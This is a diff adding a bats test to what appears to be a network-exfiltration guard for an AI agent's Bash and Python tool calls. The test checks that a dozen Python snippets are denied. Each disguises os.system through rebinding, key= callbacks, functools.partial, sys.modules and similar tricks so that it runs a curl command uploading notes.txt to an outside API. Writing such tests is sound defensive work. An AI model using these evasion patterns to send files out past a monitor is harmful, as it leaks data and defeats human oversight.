@@ -456,6 +456,49 @@ print('https://chat.example.com/api')"
     denied
 }
 
+@test "outgoing: Python code that rebinds a name or hands a function on as a value is not known to stay here" {
+    destinations 'host:chat.example.com company order'
+    local c curl="'curl -d @notes.txt https://chat.example.com/api'"
+    local -a codes=(
+        "import os
+print = os.system
+print(${curl})"
+        "import os
+def f(print):
+    print(${curl})
+f(os.system)"
+        "import os
+for len in [os.system]:
+    len(${curl})"
+        "import os
+def g(x):
+    return x
+g = os.system
+g(${curl})"
+        "import os
+sorted([${curl}], key=os.system)"
+        "from os import system
+max([${curl}], key=system)"
+        "import os, sys
+sys.call_tracing(os.system, (${curl},))"
+        "import os, operator
+operator.call(os.system, ${curl})"
+        "import os, collections, functools
+collections.defaultdict(functools.partial(os.system, ${curl}))['k']"
+        "import os, itertools
+list(itertools.starmap(os.system, [(${curl},)]))"
+        "import sys
+sys.modules['os'].system(${curl})"
+        "import os
+o = os
+o.system(${curl})"
+    )
+    for c in "${codes[@]}"; do
+        py_heredoc "${c}"
+        denied || { echo "passed: ${c}"; return 1; }
+    done
+}
+
 # --- a network command ------------------------------------------------------------------
 
 bash_call() { call Bash "$(jq -n --arg c "$1" '{command: $c}')"; }
